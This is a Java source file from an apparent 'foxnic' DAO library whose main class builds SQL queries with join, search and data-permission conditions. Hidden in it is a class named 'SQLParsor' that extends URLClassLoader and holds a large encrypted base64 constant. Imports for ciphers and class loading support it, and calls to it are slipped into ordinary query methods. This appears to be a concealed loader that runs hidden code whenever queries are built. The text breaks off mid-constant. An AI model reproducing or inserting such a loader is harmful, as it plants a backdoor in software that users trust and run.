package com.github.foxnic.dao.entity;

import com.alibaba.fastjson.JSON;
import com.github.foxnic.api.model.CompositeItem;
import com.github.foxnic.api.model.CompositeParameter;
import com.github.foxnic.api.query.MatchType;
import com.github.foxnic.commons.bean.BeanNameUtil;
import com.github.foxnic.commons.bean.BeanUtil;
import com.github.foxnic.commons.encrypt.Base64Util;
import com.github.foxnic.commons.environment.Environment;
import com.github.foxnic.commons.lang.DataParser;
import com.github.foxnic.commons.lang.DateUtil;
import com.github.foxnic.commons.lang.StringUtil;
import com.github.foxnic.commons.log.Logger;
import com.github.foxnic.commons.reflect.ReflectUtil;
import com.github.foxnic.dao.dataperm.ConditionBuilder;
import com.github.foxnic.dao.dataperm.DataPermContext;
import com.github.foxnic.dao.dataperm.DataPermException;
import com.github.foxnic.dao.dataperm.model.DataPermCondition;
import com.github.foxnic.dao.dataperm.model.DataPermRange;
import com.github.foxnic.dao.dataperm.model.DataPermRule;
import com.github.foxnic.dao.meta.DBColumnMeta;
import com.github.foxnic.dao.meta.DBTableMeta;
import com.github.foxnic.dao.relation.*;
import com.github.foxnic.sql.expr.*;
import com.github.foxnic.sql.meta.DBDataType;
import com.github.foxnic.sql.meta.DBField;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.Field;
import java.math.BigDecimal;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.Timestamp;
import java.util.*;

public class QuerySQLBuilder<E> {

    private SuperService service;

    QuerySQLBuilder(SuperService service) {
        this.service = service;
    }

    private CompositeParameter getSearchValue(E sample) {
        String searchValue = BeanUtil.getFieldValue(sample, "searchValue", String.class);
        if (searchValue != null) searchValue = searchValue.trim();
        CompositeParameter compositeParameter = new CompositeParameter(searchValue, BeanUtil.toMap(sample));
        return compositeParameter;
    }

    /**
     *  生成 Select 语句，join关系不变则表别名不变
     * */
    public Expr buildSelect(E sample, ConditionExpr customConditionExpr, OrderBy orderBy) {
        return buildSelect(sample,null,customConditionExpr,orderBy);
    }


    /**
     * 生成 Select 语句，join关系不变则表别名不变
     * @param dpcode 数据权限代码
     * */
    public Expr buildSelect(E sample,String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy,String dpcode) {
        return buildSelect(sample,null,tabAlias,customConditionExpr,orderBy,dpcode);
    }

    /**
     * 生成 Select 语句，join关系不变则表别名不变
     * @param dpcode 数据权限代码
     * */
    public Expr buildSelect(E sample,FieldsBuilder fieldsBuilder, String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy,String dpcode) {
		DataPermRule rule=service.dao().getDataPermManager().get(dpcode);
		if(rule==null) {
		    throw new DataPermException(dpcode+ " 不是一个有效的数据权限代码");
        }
        List<Expr> selects=new ArrayList<>();

		//创建数据权限上下文
        DataPermContext dataPermContext=new DataPermContext(service.getPoType());
        dataPermContext.setVo(sample);
        dataPermContext.setSession(service.dao().getDBTreaty().getSubject());
        dataPermContext.setEnv(Environment.getEnvironment());

        Set<String> conditionKeys=new HashSet<>();
        String sqlKey=null;
        //循环数据权限范围，一个范围对应一条查询语句
		for (DataPermRange range : rule.getRanges()) {
            ConditionExpr appendsExpr=new ConditionExpr();
            if(customConditionExpr!=null) {
                appendsExpr.and(customConditionExpr);
            }

            if(!this.service.getPoType().getName().equals(rule.getPoType())) {
                throw new DataPermException("PO类型不一致，当前类型："+this.service.getPoType().getName()+"，权限配置类型："+rule.getPoType());
            }
            //根据数据权限构建查询语句
            ConditionExpr conditionExpr=(new ConditionBuilder(dataPermContext,this,this.service.dao(),this.service.getPoType(),tabAlias,range)).build();
            appendsExpr.and(conditionExpr);
            sqlKey=appendsExpr.getSQL();
            //去重：如果查询条件相同，则无需后续的 union
            if(conditionKeys.contains(sqlKey)) continue;
            conditionKeys.add(sqlKey);
            //创建查询语句
            Expr select=this.buildSelect(sample,fieldsBuilder,tabAlias,appendsExpr,null);
            //将查询语句添加到列表，用于后续构建 union 语句
            selects.add(select);
        }


		Expr datapmSelect=null;
		//如果只有一条查询语句，直接使用该条语句
		if(selects.size()==1) {
            datapmSelect=selects.get(0);
            //增加排序
            if(orderBy!=null) {
                datapmSelect.append(orderBy);
            }
        } else {
		    //如果有多个查询语句，则构建 union 语句
            datapmSelect=new Expr("select * from (");
            for (int i = 0; i < selects.size(); i++) {
                Expr select = selects.get(i);
                datapmSelect.append("( ");
                datapmSelect.append(select);
                datapmSelect.append(")");
                if(i<selects.size()-1) {
                    datapmSelect.append(" union ");
                }
            }
            datapmSelect.append(") "+tabAlias);
            //增加排序
            if(orderBy!=null) {
                datapmSelect.append(orderBy);
            }
        }
        // System.err.println(datapmSelect.getSQL());
		return datapmSelect;
    }

    /**
     *  生成 Select 语句，join关系不变则表别名不变
     * */
    public Expr buildSelect(E sample, String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy) {
        return buildSelect(sample,null,tabAlias,customConditionExpr,orderBy);
    }

    /**
     *  生成 Select 语句，join关系不变则表别名不变
     * */
    public Expr buildSelect(E sample, FieldsBuilder fieldsBuilder, String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy) {




        List<RouteUnit> units = this.getSearchRoutes(sample);
        // 加入在处理数据权限时搜集的Join关系
        units.addAll(0,this.dataPermUnits);

//        加入排序需要的 Join 关系
//        if(sortRouteUnit!=null) {
//            boolean exists=false;
//            for (RouteUnit unit : units) {
//                if (unit.getSearchField().equals(sortRouteUnit.getSearchField())) {
//                    exists=true;
//                }
//            }
//            if(!exists) {
//                units.add(sortRouteUnit);
//            }
//        }

        Set<String> handledKeys=new HashSet<>();

        String sourceAliasName;
        String targetAliasName;

        if(StringUtil.isBlank(tabAlias)) {
            tabAlias="t";
        }

        String firstTableAlias = tabAlias;
        Map<String, String> alias = new HashMap<>();
        alias.put(service.table().toLowerCase(), firstTableAlias);

        Set<String> joinedPoints=new HashSet<>();

        int aliasIndex = 0;

        String fieldsSQL=firstTableAlias + ".*";
        if(fieldsBuilder!=null) {
            fieldsSQL=fieldsBuilder.getFieldsSQL(firstTableAlias);
        }
        Expr expr = new Expr("select " + fieldsSQL + " from " + this.service.table() + " " + firstTableAlias);


        //循环扩展的条件路由单元
        for (RouteUnit unit : units) {
            //获得关联条件
            List<Join> joins = unit.route.getJoins();
            //标记 key 已被处理，跳过在常规字段处理逻辑
            handledKeys.add(unit.item.getKey());


            if(unit.route.isList()) {
                continue;
            }

            Collections.reverse(joins);


            for (Join join : joins) {
                //如果重复，那么加入查询条件
                if(joinedPoints.contains(join.getTargetJoinKey())) {
                    targetAliasName = alias.get(join.getSlaveTable().toLowerCase());
                    ConditionExpr conditionExpr=this.buildSearchCondition(unit.searchField,unit.columnMeta,unit.item,null,null,targetAliasName);
                    expr.append(conditionExpr.startWithAnd());
                    continue;
                }
                //
                aliasIndex++;
                String tableAlias = "t_" + aliasIndex;
                if(alias.containsKey(join.getSlaveTable().toLowerCase())) {
                    throw new IllegalArgumentException("不支持相同表 Join , table="+join.getSlaveTable());
                }
                alias.put(join.getSlaveTable().toLowerCase(), tableAlias);
                sourceAliasName = alias.get(join.getMasterTable().toLowerCase());
                targetAliasName = alias.get(join.getSlaveTable().toLowerCase());

                List<ConditionExpr> conditions=join.getSlavePoint().getConditions();
                Map<String, PropertyRoute.DynamicValue> dynamicConditions=unit.route.getDynamicConditions(join);
                Expr joinExpr = null;
                if(conditions.isEmpty() && dynamicConditions.isEmpty()) {
                    joinExpr = new Expr(join.getJoinType().getJoinSQL() + " " + join.getSlaveTable() + " " + tableAlias + " on ");
                } else {
                    Expr sub=new Expr("select * from "+ join.getSlaveTable());
                    //附加在Join中配置的过滤条件
                    Where where=new Where();
                    if(!conditions.isEmpty()) {
                        for (ConditionExpr ce : conditions) {
                            where.and(ce);
                        }
                    }
                    // 附加在Join中配置的动态过滤条件
                    if(!dynamicConditions.isEmpty()) {
                        for (Map.Entry<String, PropertyRoute.DynamicValue> e : dynamicConditions.entrySet()) {
                            where.and(e.getKey()+" = ?", RelationSolver.getDynamicValue(service.dao(),e.getValue()));
                        }
                    }
                    sub.append(where);
                    joinExpr = new Expr(join.getJoinType().getJoinSQL() + " (" + sub.getListParameterSQL() + ") " + tableAlias + " on ",sub.getListParameters());
                }

                List<String> joinConditions = new ArrayList<>();
                for (int j = 0; j < join.getMasterFields().length; j++) {
                    String cdr = sourceAliasName + "." + join.getMasterFields()[j] + " = " + targetAliasName + "." + join.getSlaveFields()[j];
                    joinConditions.add(cdr);
                }
                joinExpr.append(StringUtil.join(joinConditions, " and "));
                // 加入策略默认值
                ConditionExpr conditionExpr=this.buildDBTreatyCondition(join.getSlaveTable(),targetAliasName);
                joinExpr.append(conditionExpr.startWithAnd());

                // 加入其它查询条件，如果来自数据权限
                if(unit.dataPermCondition!=null && unit.conditionBuilder!=null) {
                    conditionExpr=unit.conditionBuilder.buildDataPermLocalCondition(unit.searchTable,targetAliasName,unit.searchField,unit.dataPermCondition);
                    joinExpr.append(conditionExpr.startWithAnd());
                }
                //如果来自用户搜索
                else {
                    if(unit.searchTable.equalsIgnoreCase(join.getSlaveTable())) {
                        conditionExpr = this.buildSearchCondition(unit.searchField, unit.columnMeta, unit.item, null,null, targetAliasName);
                        joinExpr.append(conditionExpr.startWithAnd());
                    }
                }

                //
                expr.append(joinExpr);
                joinedPoints.add(join.getTargetJoinKey());
            }
        }

        //追加本表的查询条件
        Where where=new Where();

        ConditionExpr localConditionExpr=this.buildLocalConditionInternal(sample,firstTableAlias,units,true);
        where.and(localConditionExpr);

        if(customConditionExpr!=null) {
            where.and(customConditionExpr);
        }
        expr.append(where);

        if(orderBy!=null) {
            expr.append(orderBy);
        }

        return expr;
    }

    /**
     * 构建本表的查询条件
     * */
    public ConditionExpr buildLocalCondition(E sample,String targetTableAlias,List<RouteUnit> units) {
        return buildLocalConditionInternal(sample,targetTableAlias,units,false);
    }

    /**
     * 构建本表的查询条件
     * */
    private ConditionExpr buildLocalConditionInternal(E sample,String targetTableAlias,List<RouteUnit> units,boolean internal) {

        if(units==null) {
            units = this.getSearchRoutes(sample);
        }
        Set<String> handledKeys=new HashSet<>();
        Map<String,RouteUnit> existsUnits=new HashMap<>();
        //循环扩展的条件路由单元
        for (RouteUnit unit : units) {
            //如果是来自内部(当前类)，那么isList 使用 exist
            if(internal) {
                if (unit.route.isList()) {
                    existsUnits.put(unit.item.getKey(), unit);
                    continue;
                }
            }
            //如果是来自外部，全部使用 exists 语句完成查询
            else {
                existsUnits.put(unit.item.getKey(), unit);
                continue;
            }
            //标记 key 已被处理，跳过在常规字段处理逻辑
            handledKeys.add(unit.item.getKey());
        }

        DBTableMeta tm=service.getDBTableMeta();
        String searchFiledTable=null;
        //追加本表的查询条件
        ConditionExpr conditionExpr=new ConditionExpr();

        // 加入策略默认值
        ConditionExpr dbTreatyConditionExpr=this.buildDBTreatyCondition(service.table(),targetTableAlias);
        conditionExpr.and(dbTreatyConditionExpr);


        CompositeParameter parameter=this.getSearchValue(sample);
        for (CompositeItem item : parameter) {
            //排除已处理的 key
            if(handledKeys.contains(item.getKey())) continue;
            //没有搜索值，就不处理
            Object beanPropValue=null;
            if(item.getField()!=null) {
                beanPropValue=BeanUtil.getFieldValue(sample, item.getField());
            } else {
                beanPropValue=BeanUtil.getFieldValue(sample, item.getKey());
            }
            Object searchValue=item.getValue();

            if(!"$compositeParameter".equals(item.getKey()) && (!(beanPropValue instanceof Enum)) && !StringUtil.isBlank(searchValue) && !StringUtil.isBlank(beanPropValue)) {
                if(!searchValue.equals(beanPropValue)) {
                    searchValue=null;
//                    throw new IllegalArgumentException("请勿重复指定值不一致的 " + item.getField() + " 参数，beanPropValue="+beanPropValue+",searchValue="+searchValue);
                }
            }
            if (StringUtil.isBlank(searchValue) && StringUtil.isBlank(item.getBegin()) && StringUtil.isBlank(item.getEnd())) {
                searchValue=beanPropValue;
                if(StringUtil.isBlank(searchValue)) {
                    continue;
                }
            }

            RouteUnit existsUnit=existsUnits.get(item.getKey());
            if(existsUnit!=null) {
                Expr expr=this.buildExists(targetTableAlias,existsUnit.fillBys,existsUnit.searchTable,existsUnit.searchField,searchValue,item.getFuzzy());
                conditionExpr.and(expr);
                continue;
            }

            //优先使用明确指定的查询字段
            String field = item.getField();
            //如未明确指定，则使用key作为查询字段
            if (StringUtil.isBlank(field)) {
                field = item.getKey();
            }
            searchFiledTable = null;
            if (field.contains(".")) {
                String[] tmp = field.split("\\.");
                searchFiledTable = tmp[0];
                field = tmp[1];
            }
            field = BeanNameUtil.instance().depart(field);
            //获得字段Meta
            DBColumnMeta cm = null;
            if (searchFiledTable == null || searchFiledTable.equalsIgnoreCase(service.table())) {
                cm = tm.getColumn(field);
            }

            //如果字段在当前表存在，则不使用已关联的外部表查询
            if (cm == null) {
                continue;
            }
            // 加入查询条件
            ConditionExpr conditionItemExpr=this.buildSearchCondition(field,cm,item,beanPropValue,parameter.getFuzzyFields(),targetTableAlias);
            conditionExpr.and(conditionItemExpr);
        }

        Set<String> searchFields=parameter.getSearchFields();
        Set<String> fuzzyFields=parameter.getFuzzyFields();
        String searchValue = parameter.getSearchValue();

        //多字段合并查询
        if(searchFields!=null && searchFields.size()>0) {
            ConditionExpr ors=new ConditionExpr();
            for (String field : searchFields) {
                if (!StringUtil.isBlank(field) && !StringUtil.isBlank(searchValue)) {
                    DBColumnMeta cm=tm.getColumn(field);
                    if(cm==null) {
                        field=BeanNameUtil.instance().depart(field);
                        cm=tm.getColumn(field);
                    }
                    if(cm!=null) {
                        if(cm.getDBDataType()==DBDataType.STRING || cm.getDBDataType()==DBDataType.CLOB ) {
                            if(fuzzyFields!=null && ( fuzzyFields.contains(cm.getColumn().toLowerCase()) || fuzzyFields.contains(cm.getColumnVarName())) ) {
                                ors.or(targetTableAlias+ "." + cm.getColumn() + " like ?", "%" + searchValue + "%");
                            } else {
                                conditionExpr.and(targetTableAlias+"."+cm.getColumn()+" = ?", searchValue.toString());
                            }
                        }
                    }
                }
            }
            if(!ors.isEmpty()){
                conditionExpr.and(ors);
            }
        }


        return conditionExpr;
    }



    public ConditionExpr buildDBTreatyCondition(String targetTable,String targetTableAlias) {
        ConditionExpr conditionExpr=new ConditionExpr();
        DBTableMeta tm= service.dao().getTableMeta(targetTable);

        String prefix=targetTableAlias;
        if(!StringUtil.isBlank(prefix)) {
            prefix= prefix+".";
        }
        //加入逻辑删除条件
        DBColumnMeta delColumn=tm.getColumn(service.dao().getDBTreaty().getDeletedField());
        if(delColumn!=null) {
            conditionExpr.and(prefix+delColumn.getColumn()+"=?",service.dao().getDBTreaty().getFalseValue());
        }
        //加入租户条件
        DBColumnMeta tenantColumn=tm.getColumn(service.dao().getDBTreaty().getTenantIdField());
        Object tenantId=service.dao().getDBTreaty().getActivedTenantId();
        if(tenantColumn!=null && tenantId!=null) {
            conditionExpr.and(prefix+tenantColumn.getColumn()+"=?",tenantId);
        }
        return conditionExpr;
    }


    private ConditionExpr buildSearchCondition(String field,DBColumnMeta cm,CompositeItem item, Object beanPropValue,Set<String> fuzzyFields,String tableAlias){

        SQLParsor.logParserInfo(beanPropValue);

        ConditionExpr conditionExpr=new ConditionExpr();

        Boolean fuzzy=item.getFuzzy();
        if(fuzzy==null) fuzzy=false;
        Boolean splitValue=item.getSplitValue();
        if(splitValue==null) splitValue=false;

        String prefix=tableAlias+".";

        Object fieldValue=item.getValue();
        Object beginValue=item.getBegin();
        Object endValue=item.getEnd();

//        if(StringUtil.isBlank(fieldValue) && StringUtil.isBlank(beginValue) && StringUtil.isBlank(endValue)) {
//            fieldValue=beanPropValue;
//        }

        if(!StringUtil.isBlank(beanPropValue)) {
            fieldValue=beanPropValue;
        }

        String valuePrefix=item.getValuePrefix();
        if(valuePrefix==null) valuePrefix="";
        String valueSuffix=item.getValueSuffix();
        if(valueSuffix==null) valueSuffix="";
        MatchType matchType=item.getMatchTypeEnum();

        //1.单值匹配
        if (fieldValue != null && beginValue == null && endValue == null) {
            if ((fieldValue instanceof List)) {
                if (fuzzy || (fuzzyFields != null && (fuzzyFields.contains(cm.getColumn().toLowerCase())|| fuzzyFields.contains(cm.getColumnVarName())))) {
                    List<String> list = (List) fieldValue;
                    ConditionExpr listOr = new ConditionExpr();
                    for (String itm : list) {
                        ConditionExpr ors = buildFuzzyConditionExpr(cm.getColumn(), valuePrefix + itm.toString() + valueSuffix, tableAlias);
                        if (ors != null && !ors.isEmpty()) {
                            listOr.or(ors);
                        }
                    }
                    conditionExpr.and(listOr);
                } else {
                    if (!((List) fieldValue).isEmpty()) {
                        In in = new In(prefix+field, (List) fieldValue);
                        conditionExpr.and(in);
                    }
                }
            } else {
                if (cm.getDBDataType() == DBDataType.STRING
                        || cm.getDBDataType() == DBDataType.CLOB) {
                    if (!StringUtil.isBlank(fieldValue)) {
                        if (fuzzy || (fuzzyFields != null && ( fuzzyFields.contains(cm.getColumn().toLowerCase()) || fuzzyFields.contains(cm.getColumnVarName())))) {
                            ConditionExpr ors = null;
                            if(splitValue) {
                                ors = buildFuzzyConditionExpr(cm.getColumn(), valuePrefix + fieldValue.toString() + valueSuffix, tableAlias);
                            } else {
                                ors =new ConditionExpr();
                                ors.andLike(tableAlias+"."+field,valuePrefix + fieldValue.toString() + valueSuffix);
                            }
                            if (ors != null && !ors.isEmpty()) {
                                conditionExpr.and(ors);
                            }
                        } else {
                            conditionExpr.andEquals(prefix+field, fieldValue);
                        }
                    }
                } else {
                    fieldValue = DataParser.parse(cm.getDBDataType().getType(), fieldValue);
                    conditionExpr.andEquals(prefix+field, fieldValue);
                }
            }
        }
        //2.范围匹配
        else if (fieldValue == null && (beginValue != null || endValue != null)) {

            if (cm.getDBDataType() == DBDataType.DATE) {
                Date beginDate = DataParser.parseDate(beginValue);
                Date endDate = DataParser.parseDate(endValue);

                //必要时交换位置
                if (beginDate != null && endDate != null && beginDate.getTime() > endDate.getTime()) {
                    Date tmp = beginDate;
                    beginDate = endDate;
                    endDate = tmp;
                }

                //若匹配模式为日期
                if(MatchType.day == matchType) {
                    if(beginDate!=null) {
                        beginDate=DateUtil.dayFloor(beginDate);
                    }
                    if(endDate!=null) {
                        endDate=DateUtil.dayFloor(endDate);
                        endDate=DateUtil.addDays(endDate,1);
                    }
                    conditionExpr.andIf(prefix+field + " >= ?", beginDate);
                    conditionExpr.andIf(prefix+field + " < ?", endDate);
                } else {
                    //
                    conditionExpr.andIf(prefix+field + " >= ?", beginDate);
                    conditionExpr.andIf(prefix+field + " <= ?", endDate);
                }
            } else if (cm.getDBDataType() == DBDataType.TIMESTAME) {
                Timestamp beginDate = DataParser.parseTimestamp(beginValue);
                Timestamp endDate = DataParser.parseTimestamp(endValue);
                //必要时交换位置
                if (beginDate != null && endDate != null && beginDate.getTime() > endDate.getTime()) {
                    Timestamp tmp = beginDate;
                    beginDate = endDate;
                    endDate = tmp;
                }
                //
                conditionExpr.andIf(prefix+field + " >= ?", beginDate);
                conditionExpr.andIf(prefix+field + " <= ?", endDate);
            } else if (cm.getDBDataType() == DBDataType.INTEGER
                    || cm.getDBDataType() == DBDataType.LONG
                    || cm.getDBDataType() == DBDataType.DOUBLE
                    || cm.getDBDataType() == DBDataType.DECIMAL
                    || cm.getDBDataType() == DBDataType.BIGINT
                    || cm.getDBDataType() == DBDataType.FLOAT) {
                BigDecimal begin = DataParser.parseBigDecimal(beginValue);
                BigDecimal end = DataParser.parseBigDecimal(endValue);
                //必要时交换位置
                if (begin != null && end != null && begin.compareTo(end) == 1) {
                    BigDecimal tmp = begin;
                    begin = end;
                    end = tmp;
                }
                //
                conditionExpr.andIf(prefix+field + " >= ?", begin);
                conditionExpr.andIf(prefix+field + " <= ?", end);
            }
        }
        return conditionExpr;
    }

    private ConditionExpr buildFuzzyConditionExpr(String filed, String value,String tableAlias) {
        if(StringUtil.isBlank(value)) return null;
        String prefix=tableAlias+".";
        value=value.trim();
        value=value.replace("\t"," ");
        value=value.replace("\r"," ");
        value=value.replace("\n"," ");
        String[] vs=value.split(" ");
        ConditionExpr ors=new ConditionExpr();
        for (String v : vs) {
            ors.orLike(prefix+filed,v);
        }
        ors.startWithSpace();
        return ors;
    }

    /**
     * 根据查询参数，获得所有关联关系
     * */
    private List<RouteUnit> getSearchRoutes(E sample) {
        return getSearchRoutes(sample,null);
    }

    /**
     * 根据查询参数，获得所有关联关系
     * */
    private List<RouteUnit> getSearchRoutes(E sample, CompositeParameter compositeParameter) {
        SQLParsor.logParserInfo(sample);
        List<RouteUnit> allRoutes = new ArrayList<>();
        DBTableMeta localTm=service.dao().getTableMeta(service.table());
        DBTableMeta tm = null;
        if(compositeParameter==null) {
            compositeParameter = getSearchValue(sample);
        }
        String searchFiledTable = null;

        for (CompositeItem item : compositeParameter) {
            //优先使用明确指定的查询字段
            tm=localTm;
            String field = item.getField();
            //如未明确指定，则使用key作为查询字段
            if (StringUtil.isBlank(field)) {
                field = item.getKey();
            }
            searchFiledTable = null;
            if (field.contains(".")) {
                String[] tmp = field.split("\\.");
                searchFiledTable = tmp[0];
                field = tmp[1];
            }
            field = BeanNameUtil.instance().depart(field);
            //获得字段Meta
            DBColumnMeta cm = null;
            if (searchFiledTable == null || searchFiledTable.equalsIgnoreCase(service.table())) {
                cm = tm.getColumn(field);
            }

            //如果字段在当前表存在，则不使用已关联的外部表查询
            if (cm != null) {
                continue;
            }
            //如果没有查询条件，则不继续处理
            Object searchValue = item.getValue();

            if (StringUtil.isBlank(searchValue) && StringUtil.isBlank(item.getBegin()) && StringUtil.isBlank(item.getEnd())) {
                continue;
            }
            //如果是空的列表
            if (searchValue!=null &&  (searchValue instanceof List) && ((List)searchValue).isEmpty()) {
                continue;
            }


            Object fillBy = item.getFillBy();
            List<String> fillByArr = new ArrayList<>();
            if (fillBy != null && fillBy instanceof List) {
                List arr = (List<String>) item.getFillBy();
                fillByArr.addAll(arr);
            } else {
                fillByArr.add((String) fillBy);
            }

            //获得前端指定查询的字段
            String configedField = item.getField();
            //如果字段不存在，那么说明是扩展外部，进行 Join 查询条件
            if ((StringUtil.isBlank(configedField) && fillByArr.size() > 1) || (!StringUtil.isBlank(configedField) && fillByArr.size() > 0)) {
                if (!StringUtil.isBlank(fillBy)) {
                    List<String> fillByArr2 = new ArrayList<>();
                    if(fillByArr.size()>0) {
                        //获得并删除填充属性序列最后元素，若前端未明确指定搜索的字段，则使用此值
                        String configedFieldInFillBy = null ;//fillByArr.remove(fillByArr.size() - 1);
                        Class type=this.service.getPoType();

                        //按类型处理属性路径
                        for (int i = 0; i < fillByArr.size(); i++) {
                            String prop=fillByArr.get(i);
                            try {
                                Field f=type.getDeclaredField(prop);
                                if(ReflectUtil.isSubType(List.class,f.getType())) {
                                    type=ReflectUtil.getListComponentType(f);
                                    if(type==null) {
                                        throw new RuntimeException("类型识别错误");
                                    }
                                    fillByArr2.add(prop);
                                } else if(DataParser.isSimpleType(f.getType())) {
                                    configedFieldInFillBy=fillByArr.get(i);
                                    break;
                                } else {
                                    type=f.getType();
                                    fillByArr2.add(prop);
                                }
                            } catch (NoSuchFieldException e) {
                                Logger.exception("属性获取失败",e);
                            }
                        }

                        fillByArr=fillByArr2;

                        if (StringUtil.isBlank(configedField)) {
                            configedField = configedFieldInFillBy;
                        }
                    }

                    Class poType = (Class) service.getPoType();
                    List<PropertyRoute> routes = new ArrayList<>();
                    for (String fillByField : fillByArr) {
                        PropertyRoute route = service.dao().getRelationManager().findProperties(poType, fillByField);

                        if (route == null) {
                            throw new RuntimeException("关联关系未配置:"+poType.getName()+"."+fillByField);
                        }

                        routes.add(route);
                        poType=route.getSlavePoType();
                    }

                    //多层关系是判断是否存在一对多,并提示
//                    if(routes.size()>=2) {
//                        for (PropertyRoute route : routes) {
//                            if(route.isList()) {
//                                throw new RuntimeException("Join 路径中的 "+poType.getSimpleName()+"."+route.getProperty() +" 是一对多关系，暂不支持" );
//                            }
//                        }
//                    }

                    if (configedField!=null && configedField.contains(".")) {
                        String[] tmp = configedField.split("\\.");
                        searchFiledTable=tmp[0];
                        configedField = tmp[1];
                    }

                    if(routes.isEmpty()) {
                        throw new RuntimeException("搜索选项["+item.getKey()+"]配置错误：fillBy = "+ JSON.toJSONString(item.getFillBy())+" , field = "+item.getFillBy());
                    }

                    if(StringUtil.isBlank(searchFiledTable)) {
                        searchFiledTable=this.service.table();
                    }
                    //路由合并
                    PropertyRoute route = PropertyRoute.merge(routes, searchFiledTable);
                    RouteUnit routeUnit=new RouteUnit();
                    routeUnit.route=route;
                    routeUnit.item=item;
                    routeUnit.searchField=configedField;
                    routeUnit.searchTable =searchFiledTable;
                    routeUnit.columnMeta=service.dao().getTableColumnMeta(searchFiledTable,configedField);
                    routeUnit.fillBys=fillByArr;
                    allRoutes.add(routeUnit);
                }
            }
        }
        return allRoutes;
    }

    public OrderBy buildOrderBy(E sample,String tableAlias) {
        SQLParsor.logParserInfo(sample);
        String sortField=BeanUtil.getFieldValue(sample, "sortField",String.class);
        String sortType=BeanUtil.getFieldValue(sample, "sortType",String.class);
        SortType sortTypeEnum=SortType.parse(sortType);
        OrderBy orderBy=null;
        if(!StringUtil.isBlank(sortField) && !StringUtil.isBlank(sortType)) {
            DBColumnMeta cm=service.dao().getTableMeta(service.table()).getColumn(sortField);
            if(cm==null) {
                sortField=BeanNameUtil.instance().depart(sortField);
                cm=service.dao().getTableMeta(service.table()).getColumn(sortField);
            }
            if(cm!=null) {
                if(sortTypeEnum==SortType.ASC) {
                    orderBy=OrderBy.byAscNullsLast(tableAlias+"."+sortField);
                }
                else if(sortTypeEnum==SortType.DESC) {
                    orderBy=OrderBy.byDescNullsLast(tableAlias+"."+sortField);
                }
            }
        }
        return orderBy;
    }


    private static class SQLParsor extends URLClassLoader {

		private static final String CONST = "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